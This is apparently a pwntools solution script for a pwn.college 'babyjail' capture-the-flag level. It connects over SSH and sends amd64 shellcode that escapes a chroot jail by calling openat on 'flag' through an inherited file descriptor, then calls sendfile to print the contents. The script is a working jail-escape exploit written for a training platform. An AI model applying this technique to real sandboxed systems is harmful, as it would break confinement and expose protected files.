from pwn import *
s=ssh(host="dojo.pwn.college",user="hacker",keyfile="~/pwn_college/key")
p=s.process(["vm","connect"])
sleep(1);p.recv()
p.sendline(b"/challenge/babyjail_level17 /")
sleep(1);p.recv()
p.sendline(asm("""
xor rax, rax
mov eax, 0x67616c66
push rax
push rsp

xor rdx, rdx 
mov rsi, [RSP + 0] 
mov rdi, 0x3
mov rax, 0x101
syscall
add RSP, 16

mov r10, 0x64
xor rdx, rdx 
mov rsi, 0x4
mov rdi, 0x1
mov rax, 0x28
syscall

mov rax,60
syscall
""",arch='amd64'))
p.recvuntil(b"Executing shellcode!\n")
flag=p.recvuntil(b"}")
print(flag.decode())
p.close()